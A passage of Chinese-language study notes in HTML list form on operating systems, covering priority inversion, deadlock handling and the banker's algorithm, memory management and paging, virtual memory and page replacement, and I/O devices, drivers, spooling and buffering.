ms之前调度执行，该任务的紧急程度(松弛程度)为100 ms</li></ul></li></ul></li><li>优先级倒置(Priority inversion problem)<ul><li>优先级倒置的形成<ul><li>高优先级进程被低优先级进程延迟或阻塞。</li></ul></li><li>优先级倒置的解决方法<ul><li>简单的:假如进程P3在进入临界区后P3所占用的处理机就不允许被抢占</li><li>实用的:建立在动态优先级继承基础上的</li></ul></li></ul></li></ul><h3 id="死锁概述"><a class="header-anchor" href="#死锁概述"></a>死锁概述</h3><ul><li>资源问题<ul><li>可重用性资源<ul><li>计算机外设</li></ul></li><li>消耗性资源<ul><li>数据，消息</li></ul></li><li>可抢占性资源<ul><li>不引起死锁</li><li>CPU，内存</li></ul></li><li>不可抢占性资源<ul><li>光驱，打印机</li></ul></li></ul></li><li>计算机系统中的死锁<ul><li>竞争不可抢占性资源引起死锁</li><li>竞争可消耗资源引起死锁</li><li>进程推进顺序不当引起死锁</li></ul></li><li>死锁的定义，必要条件和处理方法<ul><li>定义:如果一组进程中的每一个进程都在等待仅由该进程中的其他进程才能引发的事件，那么该组进程是死锁的</li><li>产生死锁的必要条件<ul><li>互斥条件</li><li>请求和保存条件</li><li>不可抢占条件</li><li>循环等待条件<ul><li>如果每个资源只有一个实例，则环路等待条件是死锁存在的充分必要条件</li></ul></li></ul></li><li>处理死锁的方法<ul><li>预防死锁<ul><li>静态方法，在进程执行前采取的措施，通过设置某些限制条件，去破坏产生死锁的四个条件之一，防止发生死锁。</li><li>预防死锁的策略<ul><li>破坏&quot;请求和保存&quot;条件<ul><li>第一种协议<ul><li>所有进程在开始运行之前，必须一次性地申请其在整个运行过程中所需的全部资源</li><li>优点:简单，易行，安全</li><li>缺点<ul><li>资源被严重浪费，严重地恶化了资源的利用率</li><li>使进程经常会发生饥饿现象</li></ul></li></ul></li><li>第二种协议<ul><li>它允许一个进程只获得运行初期所需的资源后，便开始运行。进程运行过程中再逐步释放已分配给自己的，且已用毕的全部资源，然后再请求新的所需资源</li></ul></li></ul></li><li>破坏&quot;不可抢占&quot;条件<ul><li>当一个已经保存了某些不可被抢占资源的进程，提出新的资源请求而不能得到满足时，它必须释放已经保持的所有资源，待以后需要时再重新申请</li></ul></li><li>破坏&quot;循环等待&quot;条件<ul><li>对系统所以资源类型进行线性排序，并赋予不同的序号</li><li>例如令输入机的序号为1，打印机序号为2，磁盘机序号为3等。所有进程对资源的请求必须严格按资源序号递增的次序提出。</li></ul></li></ul></li></ul></li><li>避免死锁<ul><li>动态的方法，在进程执行过程中采取的措施，不需事先采取限制措施破坏产生死锁的必要条件，而是在进程申请资源时用某种方法去防止系统进入不安全状态，从而避免发生死锁。如银行家算法</li><li>避免死锁的策略<ul><li>系统安全状态<ul><li>安全状态<ul><li>某时刻，对于并发执行的n个进程，若系统能够按照某种顺序如&lt;p1,p2…pn&gt;来为每个进程分配所需资源，直至最大需求，从而使每个进程都可顺利完成，则认为该时刻系统处于安全状态，这样的序列为安全序列</li></ul></li><li>安全状态之例</li><li>由安全状态向不安全状态的转换</li></ul></li><li>利用银行家算法避免死锁<ul><li>含义:每一个新进程在进入系统时，它必须申明在运行过程中，可能需要每种资源类型的最大单元数目，其数目不应超过系统所拥有的资源总量。当进程请求一组资源时，系统必须首先确定是否有足够的资源分配给该进程。若有，再进一步计算在将这些资源分配给进程后，是否会使系统处于不安全状态。如果不会，才将资源分配给它，否则让进程等待</li><li>银行家算法中的数据结构<ul><li>可用资源向量 Available[m]：m为系统中资源种类数，Available[j]=k表示系统中第j类资源数为k个。</li><li>最大需求矩阵 Max[n,m]：n为系统中进程数，Max[i,j]=k表示进程i对j类资源的最大需求数为中k。</li><li>分配矩阵 Allocation[n，m]:它定义了系统中每一类资源当前已分配给每一进程资源数，   Allocation[i,j] = k表示进程i已分得j类资源的数目为k个。</li><li>需求矩阵 Need[n,m]：它表示每个进程尚需的各类资源数，Need[i,j]=k 表示进程i   还需要j类资源k个。Need[i,j]=Max[i,j] - Allocation[i,j]</li></ul></li><li>银行家算法</li><li>安全性算法</li><li>银行家算法之例</li><li>解题<ul><li>矩阵</li><li>列表</li></ul></li></ul></li></ul></li></ul></li><li>检测死锁<ul><li>死锁的检测与解除<ul><li>死锁的检测<ul><li>资源分配图<ul><li>简化步骤<ul><li>选择一个没有阻塞的进程p</li><li>将p移走，包括它的所有请求边和分配边</li><li>重复步骤1，2，直至不能继续下去</li></ul></li></ul></li><li>死锁定理<ul><li>若一系列简化以后不能使所有的进程节点都成为孤立节点</li></ul></li><li>检测时机<ul><li>当进程等待时检测死锁 （其缺点是系统的开销大）</li><li>定时检测</li><li>系统资源利用率下降时检测死锁</li></ul></li><li>死锁检测中的数据结构</li></ul></li><li>死锁的解除<ul><li>抢占资源</li><li>终止(或撤销)进程</li><li>终止进程的方法<ul><li>终止所有死锁进程</li><li>逐个终止进程<ul><li>代价最小<ul><li>进程的优先级的大小</li><li>进程已执行了多少时间，还需时间</li><li>进程在运行中已经使用资源的多少，还需多少资源</li><li>进程的性质是交互式还是批处理的</li></ul></li></ul></li></ul></li><li>付出代价最小的死锁解除算法<ul><li>是使用一个有效的挂起和解除机构来挂起一些死锁的进程</li></ul></li></ul></li></ul></li></ul></li><li>解除死锁</li></ul></li></ul></li></ul><h2 id="第四章-存储器管理"><a class="header-anchor" href="#第四章-存储器管理"></a>第四章:存储器管理</h2><h3 id="存储器的层次结构"><a class="header-anchor" href="#存储器的层次结构"></a>存储器的层次结构</h3><ul><li>多层结构的存储系统<ul><li>存储器的多层结构<ul><li>CPU寄存器</li><li>主存</li><li>辅存</li></ul></li><li>可执行存储器<ul><li>寄存器和主存的总称</li><li>访问速度快，进程可以在很少的时钟周期内用一条load或store指令完成存取。</li></ul></li></ul></li><li>主存储器与寄存器</li><li>高速缓存和磁盘缓存</li></ul><h3 id="程序的装入和链接"><a class="header-anchor" href="#程序的装入和链接"></a>程序的装入和链接</h3><ul><li>步骤<ul><li>编译<ul><li>源程序 -&gt;目标模块（Object modules）--------Compiler<ul><li>由编译程序对用户源程序进行编译，形成若干个目标模块</li></ul></li></ul></li><li>链接<ul><li>一组目标模块 -&gt;装入模块 （Load Module）----------Linker<ul><li>由链接程序将编译后形成的一组目标模板以及它们所需要的库函数链接在一起，形成一个完整的装入模块</li></ul></li></ul></li><li>装入<ul><li>装入模块 -&gt;内存  --------Loader<ul><li>由装入程序将装入模块装入内存</li></ul></li></ul></li></ul></li><li>程序的装入<ul><li>绝对装入方式<ul><li>在编译时，如果知道程序将驻留在内存中指定的位置。编译程序将产生绝对地址的目标代码。</li></ul></li><li>可重定位装入方式<ul><li>在可执行文件中，列出各个需要重定位的地址单元和相对地址值。当用户程序被装入内存时，一次性实现逻辑地址到物理地址的转换，以后不再转换(一般在装入内存时由软件完成)。</li><li>优点：不需硬件支持，可以装入有限多道程序。</li><li>缺点：一个程序通常需要占用连续的内存空间，程序装入内存后不能移动。不易实现共享。</li></ul></li><li>动态运行时的装入方式<ul><li>动态运行时的装入程序在把装入模块装入内存后，并不立即把装入模块中的逻辑地址转换为物理地址，而是把这种地址转换推迟到程序真正要执行时才进行</li><li>优点：<ul><li>OS可以将一个程序分散存放于不连续的内存空间，可以移动程序，有利用实现共享。</li><li>能够支持程序执行中产生的地址引用，如指针变量（而不仅是生成可执行文件时的地址引用）。</li></ul></li><li>缺点：需要硬件支持，OS实现较复杂。</li><li>它是虚拟存储的基础。</li></ul></li></ul></li><li>程序的链接<ul><li>静态链接方式(lib)</li><li>装入时动态链接</li><li>运行时动态链接(dll)</li></ul></li></ul><h3 id="连续分配存储管理方式"><a class="header-anchor" href="#连续分配存储管理方式"></a>连续分配存储管理方式</h3><ul><li>连续分配<ul><li>单一连续分配(DOS)</li><li>固定分区分配(浪费很多空间)</li><li>动态分区分配</li></ul></li><li>地址映射和存储保护措施<ul><li>基址寄存器：程序的最小物理地址</li><li>界限寄存器：程序的逻辑地址范围</li><li>物理地址 = 逻辑地址 + 基址</li></ul></li><li>内碎片：占用分区之内未被利用的空间</li><li>外碎片：占用分区之间难以利用的空闲分区（通常是小空闲分区）</li><li>把内存划分为若干个固定大小的连续分区。固定式分区又称为静态分区。<ul><li>分区大小相等：只适合于多个相同程序的并发执行（处理多个类型相同的对象）。</li><li>分区大小不等：多个小分区、适量的中等分区、少量的大分区。根据程序的大小，分配当前空闲的、适当大小的分区。</li><li>优点：无外碎片、易实现、开销小。</li><li>缺点：<ul><li>存在内碎片，造成浪费</li><li>分区总数固定，限制了并发执行的程序数目。</li><li>通用Os很少采用，部分控制系统中采用</li></ul></li></ul></li><li>动态创建分区：指在作业装入内存时，从可用的内存中划出一块连续的区域分配给它，且分区大小正好等于该作业的大小。可变式分区中分区的大小和分区的个数都是可变的，而且是根据作业的大小和多少动态地划分。<ul><li>基于顺序搜索的动态分区分配算法<ul><li>首次适应算法（first fit,FF）<ul><li>顺序找，找到一个满足的就分配，但是可能存在浪费</li><li>这种方法目的在于减少查找时间。</li><li>空闲分区表（空闲区链）中的空闲分区要按地址由低到高进行排序</li></ul></li><li>循环首次适应算法（next fit，NF）<ul><li>相对上面那种，不是顺序，类似哈希算法中左右交叉排序</li><li>空闲分区分布得更均匀，查找开销小</li><li>从上次找到的空闲区的下一个空闲区开始查找，直到找到第一个能满足要求的的空闲区为止，并从中划出一块与请求大小相等的内存空间分配给作业。</li></ul></li><li>最佳适应算法（best fit，BF）<ul><li>找到最合适的，但是大区域的访问次数减少</li><li>这种方法能使外碎片尽量小。</li><li>空闲分区表（空闲区链）中的空闲分区要按大小从小到大进行排序，自表头开始查找到第一个满足要求的自由分区分配。</li></ul></li><li>最坏适应算法（worst fit，WF）<ul><li>相对于最好而言，找最大的区域下手，导致最大的区域可能很少，也造成许多碎片</li><li>空闲分区按大小由大到小排序</li></ul></li></ul></li><li>基于索引搜索的动态分区分配算法<ul><li>快速适应算法（quick fit）</li><li>伙伴系统（buddy system）</li><li>哈希算法</li></ul></li><li>动态可重定位分区分配<ul><li>紧凑</li><li>动态重定位<ul><li>动态运行时装入，地址转化在指令执行时进行，需获得硬件地址变换机制的支持</li><li>内存地址=相对地址+起始地址</li></ul></li><li>动态重定位分区分配算法<ul><li>1、在某个分区被释放后立即进行紧凑，系统总是只有一个连续的分区而无碎片，此法很花费机时。</li><li>2、当“请求分配模块”找不到足够大的自由分区分给用户时再进行紧凑，这样紧缩的次数比上种方法少得多，但管理复杂。采用此法的动态重定位分区分配算法框图如下：</li></ul></li></ul></li><li>优点：没有内碎片。</li><li>缺点：外碎片。</li></ul></li></ul><h3 id="对换（了解）"><a class="header-anchor" href="#对换（了解）"></a>对换（了解）</h3><ul><li>系统把所有的作业放在外存，每次只调用一个作业进入内存运行，当时间片用完时，将它调至外存后备队列上等待，在从后备队列调入另一个作业进入内存运行。</li></ul><h3 id="基本分页存储管理方式"><a class="header-anchor" href="#基本分页存储管理方式"></a>基本分页存储管理方式</h3><ul><li>分页存储管理的基本方式<ul><li>页面<ul><li>将一个进程的逻辑地址空间分成若干个大小相等的片</li></ul></li><li>页框（frame）<ul><li>内存空间分成与页面相同大小的存储块</li></ul></li><li>由于进程的最后一页经常装不满一块而形成了不可利用的碎片，称之为“页内碎片”</li><li>地址结构<ul><li>页号P+位移量W(0-31)</li></ul></li><li>页表<ul><li>在分页系统中，允许将进程的各个页离散地存储在内存在内存的任一物理块中，为保证进程仍然能够正确地运行，即能在内存中找到每一个页面所对应的物理块，系统又为每个进程建立了一张页面映像表，简称页表</li><li>页表的作用是实现从页面号到物理块号的地址映射</li></ul></li></ul></li><li>地址变换机构<ul><li>基本的地址变换机构<ul><li>要访问两次内存</li><li>页表大都驻留在内存中</li><li>为了实现地址变换功能，在系统中设置页表寄存器（PTR），用来存放页表的始址和页表的长度。</li><li>在进程未执行时，每个进程对应的页表的始址和长度存放在进程的PCB中，当该进程被调度时，就将它们装入页表寄存器。</li></ul></li><li>具有快表的地址变换机构<ul><li>提高了效率，此处会有计算题</li><li>如果页表存放在内存中，则每次访问内存时，都要先访问内存中的页表，然后根据所形成的物理地址再访问内存。这样CPU存一个数据必须访问两次内存，从而使计算机的处理速度降低了1/2。</li><li>为了提高地址变换的速度，在地址变换机构中增设了一个具有并行查询功能的特殊的高速缓冲存储器，称为“联想存储器”或“快表”，用以存放当前访问的那些页表项。</li><li>地址变换过程为：<ul><li>1、CPU给出有效地址</li><li>2、地址变换机构自动地将页号送入高速缓存，确定所需要的页是否在快表中。</li><li>3、若是，则直接读出该页所对应的物理块号，送入物理地址寄存器；</li><li>4、若快表中未找到对应的页表项，则需再访问内存中的页表</li><li>5、找到后，把从页表中读出的页表项存入快表中的一个寄存器单元中，以取代一个旧的页表项。</li></ul></li></ul></li></ul></li><li>两级和多级页表<ul><li>主要是有的时候页表太多了，要化简</li><li>格式：外层页号P1+外层页内地址P2+页内地址d</li><li>基本方法：将页表进行分页，每个页面的大小与内存物理块的大小相同，并为它们进行编号，可以离散地将各个页面分别存放在不同的物理块中。</li></ul></li><li>反置页表<ul><li>反置页表为每一个物理块（页框）设置一个页表项，并按物理块排序，其内容则是页号和其所属进程的标识。</li></ul></li><li>优点：<ul><li>没有外碎片，每个内碎片不超过页大小。</li><li>一个程序不必连续存放。</li><li>便于改变程序占用空间的大小。即随着程序运行而动态生成的数据增多，地址空间可相应增长。</li></ul></li><li>缺点：程序全部装入内存。</li></ul><h3 id="分段存储管理方式"><a class="header-anchor" href="#分段存储管理方式"></a>分段存储管理方式</h3><ul><li>引入<ul><li>方便编程</li><li>信息共享</li><li>动态增长</li><li>动态链接</li></ul></li><li>在分段存储管理方式中，作业的地址空间被划分为若干个段，每个段是一组完整的逻辑信息，每个段都有自己的名字，都是从零开始编址的一段连续的地址空间，各段长度是不等的。</li><li>内存空间被动态的划分为若干个长度不相同的区域，称为物理段，每个物理段由起始地址和长度确定</li><li>分段系统的基本原理<ul><li>分段<ul><li>格式：段号+段内地址</li></ul></li><li>段表<ul><li>段表实现了从逻辑段到物理内存区的映射。</li></ul></li><li>地址变换机构</li></ul></li><li>和分页的区别<ul><li>页是信息的物理单位</li><li>页的大小固定且由系统固定</li><li>分页的用户程序地址空间是一维的</li><li>通常段比页大，因而段表比页表短，可以缩短查找时间，提高访问速度。</li><li>分页是系统管理的需要，分段是用户应用的需要。一条指令或一个操作数可能会跨越两个页的分界处，而不会跨越两个段的分界处。</li></ul></li><li>信息共享<ul><li>这是分段最重要的优点</li></ul></li><li>段页式存储管理方式<ul><li>基本原理<ul><li>格式：段号（S）+段内页号（P）+页内地址（W）</li></ul></li><li>地址变换过程<ul><li>需要三次访问过程</li></ul></li><li>在段页式系统中，为了获得一条指令或数据，需三次访问内存：第一次访问内存中的段表，从中取得页表始址；第二次访问内存中的页表，从中取出该页所在的物理块号，并将该块号与页内地址一起形成指令或数据的物理地址；第三次访问才是真正根据所得的物理地址取出指令或数据。</li></ul></li></ul><h2 id="第五章：虚拟存储器"><a class="header-anchor" href="#第五章：虚拟存储器"></a>第五章：虚拟存储器</h2><h3 id="常规存储管理方式的特征"><a class="header-anchor" href="#常规存储管理方式的特征"></a>常规存储管理方式的特征</h3><ul><li>一次性</li><li>驻留性</li></ul><h3 id="局部性原理"><a class="header-anchor" href="#局部性原理"></a>局部性原理</h3><ul><li>程序在执行时将呈现出局部性特征，即在一较短的时间内，程序的执行仅局限于某个部分，相应地，它所访问的存储空间也局限于某个区域</li><li>时间局限性<ul><li>如果程序中的某条指令一旦执行， 则不久以后该指令可能再次执行；如果某数据被访问过， 则不久以后该数据可能再次被访问。产生时间局限性的典型原因，是由于在程序中存在着大量的循环操作</li></ul></li><li>空间局限性<ul><li>一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，其典型情况便是程序的顺序执行。</li></ul></li></ul><h3 id="定义"><a class="header-anchor" href="#定义"></a>定义</h3><ul><li>指具有请求调入功能和置换功能，能从逻辑上对内存容量加以扩充的一种存储器系统</li></ul><h3 id="优点"><a class="header-anchor" href="#优点"></a>优点</h3><ul><li>大程序：可在较小的可用内存中执行较大的用户程序；</li><li>大的用户空间：提供给用户可用的虚拟内存空间通常大于物理内存(real memory)</li><li>并发：可在内存中容纳更多程序并发执行；</li><li>易于开发：不必影响编程时的程序结构</li><li>以CPU时间和外存空间换取昂贵内存空间，这是操作系统中的资源转换技术</li></ul><h3 id="特征"><a class="header-anchor" href="#特征"></a>特征</h3><ul><li>离散性<ul><li>指在内存分配时采用离散的分配方式，它是虚拟存储器的实现的基础</li></ul></li><li>多次性<ul><li>指一个作业被分成多次调入内存运行，即在作业运行时没有必要将其全部装入，只须将当前要运行的那部分程序和数据装入内存即可。多次性是虚拟存储器最重要的特征</li></ul></li><li>对换性<ul><li>指允许在作业的运行过程中在内存和外存的对换区之间换进、换出。</li></ul></li><li>虚拟性<ul><li>指能够从逻辑上扩充内存容量，使用户所看到的内存容量远大于实际内存容量。</li></ul></li></ul><h3 id="虚拟存储器的实现方式"><a class="header-anchor" href="#虚拟存储器的实现方式"></a>虚拟存储器的实现方式</h3><ul><li>请求分页存储管理方式<ul><li>硬件<ul><li>请求页表机制<ul><li>格式：页号+物理块号+状态位P+访问字段A+修改位M+外存地址</li></ul></li><li>缺页中断机构</li><li>地址变换机构（过程图很关键）</li></ul></li><li>请求分页中的内存分配<ul><li>最小物理块数<ul><li>即能保证进程正常运行所需的最小物理块数</li></ul></li><li>内存分配策略<ul><li>固定分配局部置换（国王的大儿子）</li><li>可变分配全局置换（国王的二儿子）</li><li>可变分配局部置换（国王的小儿子）</li></ul></li></ul></li><li>物理块分配算法<ul><li>平均分配算法</li><li>按比例分配算法</li><li>考虑优先权的分配算法</li></ul></li><li>页面调入策略<ul><li>系统应在何时调入所需页面<ul><li>预调页策略（不能实现）</li><li>请求调页策略（需要才给）</li></ul></li><li>系统应该从何处调入这些页面<ul><li>对换区</li><li>文件区</li></ul></li><li>页面调入过程</li><li>缺页率（出计算题）</li></ul></li></ul></li><li>请求分段系统<ul><li>硬件<ul><li>请求分段的段表机构</li><li>缺段中断机构</li><li>地址变换机构</li></ul></li></ul></li></ul><h3 id="页面置换算法"><a class="header-anchor" href="#页面置换算法"></a>页面置换算法</h3><ul><li>抖动的概念<ul><li>即刚被换出的页很快又要被访问，需要将它重新调入，此时又需要再选一页调出</li></ul></li><li>最佳置换算法(需要预知后面进程，所以不能实现)</li><li>先进先出页面置换算法（FIFO）<ul><li>选择在内存中驻留时间最久的页面予以淘汰</li></ul></li><li>最近最久未使用置换算法（LRU）Recently<ul><li>寄存器支持</li><li>特殊的栈结构</li></ul></li><li>最少使用置换算法（LFU）Frequently</li><li>clock置换算法（对访问位A的判断）<ul><li>改进型——增加对修改位M思维判断</li></ul></li><li>页面缓冲算法（PBA,page buffering algorithm）<ul><li>空闲页面链表</li><li>修改页面链表</li></ul></li></ul><h2 id="第六章：输入输出系统"><a class="header-anchor" href="#第六章：输入输出系统"></a>第六章：输入输出系统</h2><h3 id="I-O系统的功能，模型和接口"><a class="header-anchor" href="#I-O系统的功能，模型和接口"></a>I/O系统的功能，模型和接口</h3><ul><li>I/O系统管理的对象是I/O设备和相应的设备控制器。</li><li>I/O系统的基本功能<ul><li>隐藏物理设备的细节</li><li>与设备的无关性</li><li>提高处理机和I/O设备的利用率</li><li>对I/O设备进行控制</li><li>确保对设备的正确共享</li><li>错误处理</li></ul></li><li>I/O软件的层次结构<ul><li>用户层I/O软件</li><li>设备独立性软件</li><li>设备驱动程序（厂家开发）</li><li>中断处理程序</li><li>硬件</li></ul></li><li>I/O系统的分层<ul><li>中断处理程序</li><li>设备驱动程序</li><li>设备独立性软件</li></ul></li><li>I/O系统接口<ul><li>块设备接口<ul><li>指以数据块为单位来组织和传送数据信息的设备</li><li>典型的块设备是磁盘、光盘</li><li>块设备的基本特征<ul><li>①传输速率较高，通常每秒钟为几兆位；</li><li>②它是可寻址的，即可随机地读/写任意一块；</li><li>③磁盘设备的I/O采用DMA方式。</li></ul></li></ul></li><li>流设备接口<ul><li>又称字符设备指以单个字符为单位来传送数据信息的设备</li><li>这类设备一般用于数据的输入和输出，有交互式终端、打印机</li><li>字符设备的基本特征<ul><li>①传输速率较低；</li><li>②不可寻址，即不能指定输入时的源地址或输出时的目标地址；</li><li>③字符设备的I/O常采用中断驱动方式。</li></ul></li></ul></li><li>网络通信接口<ul><li>提供网络接入功能，使计算机能通过网络与其他计算机进行通信或上网浏览。</li></ul></li></ul></li></ul><h3 id="I-O设备和设备控制器"><a class="header-anchor" href="#I-O设备和设备控制器"></a>I/O设备和设备控制器</h3><ul><li>分类<ul><li>使用特性分<ul><li>存储设备</li><li>I/O设备</li></ul></li><li>传输速率分<ul><li>低速设备（几字节——几百字节）<ul><li>典型的设备有键盘、鼠标、语音的输入</li></ul></li><li>中速设备（数千——数万字节）<ul><li>典型的设备有行式打印机、激光打印机</li></ul></li><li>高速设备（数十万——千兆字节）<ul><li>典型的设备有磁带机、磁盘机、光盘机</li></ul></li></ul></li></ul></li><li>设备并不是直接与CPU进行通信，而是与设备控制器通信。在设备与设备控制器之间应该有一个接口。<ul><li>数据信号：控制器 ←  设备 ←  控制器<ul><li>传送数据信号，输入、输出bit</li></ul></li><li>控制信号: 控制器  →  设备<ul><li>执行读、写操作的信号</li></ul></li><li>状态信号：设备当前使用状态</li></ul></li><li>设备控制器<ul><li>主要功能：控制一个或多个I/O设备，以实现I/O设备和计算机之间的数据交换</li><li>基本功能<ul><li>接收和识别命令<ul><li>控制寄存器、命令译码器</li></ul></li><li>数据交换<ul><li>实现CPU与控制器，控制器与设备间的数据交换</li></ul></li><li>标识和报告设备的状态</li><li>地址识别<ul><li>配置地址译码器，识别不同的设备</li></ul></li><li>数据缓冲区</li><li>差错控制</li></ul></li><li>设备控制器的组成<ul><li>设备控制器与处理机（CPU）的接口<ul><li>实现CPU与设备控制器之间的通信</li></ul></li><li>设备控制器与设备的接口<ul><li>控制器可连接多个设备</li></ul></li><li>I/O逻辑<ul><li>实现对设备的控制</li><li>CPU利用该逻辑向控制器发送I/O命令</li><li>命令、地址译码</li></ul></li></ul></li></ul></li><li>内存映像I/O<ul><li>驱动程序将抽象I/O命令转换出的一系列具体的命令，参数等数据装入设备控制器的相应寄存器，由控制器来执行这些命令，具体实施对I/O设备的操作</li></ul></li><li>I/O通道<ul><li><p>目的：建立独立的I/O操作(组织, 管理和结束)，使由CPU处理的I/O工作转由通道完成（解放CPU，实现并行）</p></li><li><p>什么是I/O通道？</p><ul><li>是一种特殊的处理机，具有通过执行通道程序完成I/O操作的指令</li><li>特点：指令单一(局限于与I/O操作相关的指令)，与CPU共享内存</li></ul></li><li><p>基本过程：</p><ul><li>CPU向通道发出I/O指令-&gt;通道接收指令-&gt;从内存取出通道程序处理I/O-&gt;向CPU发出中断</li></ul></li><li><p>通道类型</p><ul><li>字节多路通道<ul><li>低中速连接子通道时间片轮转方式共享主通道</li><li>字节多路通道不适于连接高速设备，这推动了按数组方式进行数据传送的数组选择通道的形成。</li></ul></li><li>数组选择通道<ul><li>这种通道可以连接多台高速设备，但只含有一个分配型子通道，在一段时间内只能执行一道通道程序， 控制一台设备进行数据传送， 直至该设备传送完毕释放该通道。这种通道的利用率很低。</li></ul></li><li>数组多路通道<ul><li>含有多个非分配型子通道，前两种通道的组合，通道利用率较好</li></ul></li></ul></li><li><p>瓶颈问题</p><ul><li>原因;通道不足</li><li>解决办法：增加设备到主机间的通路，而不增加通道（结果类似RS触发器）</li></ul></li></ul></li></ul><h3 id="中断机构和中断处理程序"><a class="header-anchor" href="#中断机构和中断处理程序"></a>中断机构和中断处理程序</h3><ul><li>中断<ul><li>分类<ul><li>中断（外部触发）<ul><li>对外部I/O设备发出的中断信号的响应</li></ul></li><li>陷入（内部原因：除0）<ul><li>由CPU内部事件引起的中断</li></ul></li></ul></li><li>中断向量表（类比51单片机）<ul><li>中断程序的入口地址表</li></ul></li><li>中断优先级<ul><li>对紧急程度不同的中断处理方式</li></ul></li><li>对多中断源的处理方式<ul><li>屏蔽中断</li><li>嵌套中断</li></ul></li></ul></li><li>中断处理程序<ul><li>测定是否有未响应的中断信号</li><li>保护被中断进程的CPU环境</li><li>转入相应的设备处理程序</li><li>中断处理</li><li>恢复CPU 的现场并退出中断</li></ul></li></ul><h3 id="设备驱动程序"><a class="header-anchor" href="#设备驱动程序"></a>设备驱动程序</h3><ul><li>是I/O进程与设备控制器之间的通信程序，又由于它常以进程的形式存在，故以后就简称为设备驱动进程</li><li>主要任务是接受来自它上一层的与设备无关软件的抽象请求，并执行这个请求。</li><li>功能<ul><li><ol><li>接收由I/O进程发来的命令和参数， 并将命令中的抽象要求转换为具体要求。例如，将磁盘块号转换为磁盘的盘面、 磁道号及扇区号。</li></ol></li><li><ol start="2"><li>检查用户I/O请求的合法性，了解I/O设备的状态，传递有关参数，设置设备的工作方式。</li></ol></li><li><ol start="3"><li>发出I/O命令，如果设备空闲，便立即启动I/O设备去完成指定的I/O操作；如果设备处于忙碌状态，则将请求者的请求块挂在设备队列上等待。</li></ol></li><li><ol start="4"><li>及时响应由控制器或通道发来的中断请求，并根据其中断类型调用相应的中断处理程序进行处理。</li></ol></li><li><ol start="5"><li>对于设置有通道的计算机系统，驱动程序还应能够根据用户的I/O请求，自动地构成通道程序。</li></ol></li></ul></li><li>设备驱动程序的处理过程<ul><li>将用户和上层软件对设备控制的抽象要求转换成对设备的具体要求，如对抽象要求的盘块号转换为磁盘的盘面、磁道及扇区。</li><li>检查I/O请求的合理性。</li><li>读出和检查设备的状态，确保设备处于就绪态。</li><li>传送必要的参数，如传送的字节数，数据在主存的首址等。</li><li>工作方式的设置。</li><li>启动I/O设备，并检查启动是否成功，如成功则将控制返回给I/O控制系统，在I/O设备忙于传送数据时，该用户进程把自己阻塞，直至中断到来才将它唤醒，而CPU可干别的事。</li></ul></li><li>对I/O设备的控制方式<ul><li>I/O控制的宗旨<ul><li>减少CPU对I/O控制的干预</li><li>充分利用CPU完成数据处理工作</li></ul></li><li>I/O 控制方式<ul><li>轮询的可编程I/O方式</li><li>中断驱动I/O方式</li><li>DMA控制方式</li><li>I/O通道控制方式</li></ul></li></ul></li><li>DMA控制器组成<ul><li>主机与DMA控制器的接口</li><li>DMA控制器与块设备的接口</li><li>I/O控制逻辑</li></ul></li></ul><h3 id="与设备无关的I-O软件"><a class="header-anchor" href="#与设备无关的I-O软件"></a>与设备无关的I/O软件</h3><ul><li>基本概念<ul><li>含义： 应用程序独立于具体使用的物理设备。</li><li>驱动程序是一个与硬件(或设备)紧密相关的软件。为实现设备独立性，须在驱动程序上设置一层软件，称为设备独立性软件。</li><li>设备独立性(Device Independence)的优点<ul><li>以物理设备名使用设备</li><li>引入了逻辑设备名</li><li>逻辑设备名称到物理设备名称的转换（易于实现I/O重定向）</li></ul></li></ul></li><li>与设备无关的软件<ul><li>设备驱动程序的统一接口</li><li>缓存管理</li><li>差错控制</li><li>对独立设备的分配与回收</li><li>独立于设备的逻辑数据块</li></ul></li><li>设备分配中的数据结构<ul><li>设备控制表DCT</li><li>控制器控制表COCT</li><li>通道控制表CHCT</li><li>显然，在有通道的系统中，一个进程只有获得了通道，控制器和所需设备三者之后，才具备了进行I/O操作的物理条件</li><li>系统设备表SDT</li><li>逻辑设备表LUT</li><li>分配的流程，从资源多的到资源紧张的:LUT-&gt;SDT-&gt;DCT-&gt;COCT-&gt;CHCT</li><li>在申请设备的过程中，根据用户请求的I/O设备的逻辑名，查找逻辑设备和物理设备的映射表；以物理设备为索引，查找SDT，找到该设备所连接的DCT；继续查找与该设备连接的COCT和CHCT，就找到了一条通路。</li></ul></li></ul><h3 id="用户层的I-O软件"><a class="header-anchor" href="#用户层的I-O软件"></a>用户层的I/O软件</h3><ul><li>系统调用与库函数<ul><li>OS向用户提供的所有功能，用户进程都必须通过系统调用来获取</li><li>在C语言以及UNIX系统中，系统调用（如read）与各系统调用所使用的库函数（如read）之间几乎是一一对应的。而微软的叫Win32API</li></ul></li><li>假脱机系统（spooling）<ul><li>spooling技术是对脱机输入/输出系统的模拟</li><li>主要组成<ul><li>输入/输出井</li><li>输入/输出缓冲区</li><li>输入/输出进程</li><li>井管理程序</li></ul></li><li>特点（体现操作系统的虚拟性）<ul><li>提高了I/O的速度<ul><li>对数据所进行的I/O操作，已从对低速设备演变为对输入井或输出井中的数据存取。</li></ul></li><li>将独占设备改造为共享设备<ul><li>实际分给用户进程的不是打印设备，而是共享输出井中的存储区域</li></ul></li><li>实现了虚拟设备功能<ul><li>将独占设备变成多台独占的虚拟设备。</li></ul></li></ul></li></ul></li></ul><h3 id="缓冲区管理"><a class="header-anchor" href="#缓冲区管理"></a>缓冲区管理</h3><ul><li>缓冲的引入（原因）<ul><li>缓和CPU与I/O设备间速度不匹配的矛盾</li><li>减少对CPU的中断频率，放宽对CPU中断响应时间的限制</li><li>提高CPU和I/O设备之间的并行性</li><li>解决数据粒度不匹配的问题</li></ul></li><li>单缓冲区<ul><li>即在CPU计算的时候，将数据数据输入到缓冲区(大小取决与T和C的大小)</li></ul></li><li>双缓冲区<ul><li>即允许CPU连续工作（T不断）</li></ul></li><li>环形缓冲区（专为生产者和消费者打造）<ul><li>组成<ul><li>多个缓冲区</li><li>多个指针</li></ul></li><li>使用<ul><li>Getbuf过程</li><li>Releasebuf过程</li></ul></li><li>同步问题</li></ul></li><li>缓冲池(理解为更大的缓冲区)<ul><li>组成<ul><li>空白缓冲队列（emq）<ul><li>由空缓冲区链接而成F(emq)，L(emq)分别指向该队列首尾缓冲区</li></ul></li><li>输入队列（inq）<ul><li>由装满输入数据的缓冲区链接而成F(inq)，L(inq)分别指向该队列首尾缓冲区</li></ul></li><li>输出队列（outq）<ul><li>由装满输出数据的缓冲区链接而成F(ou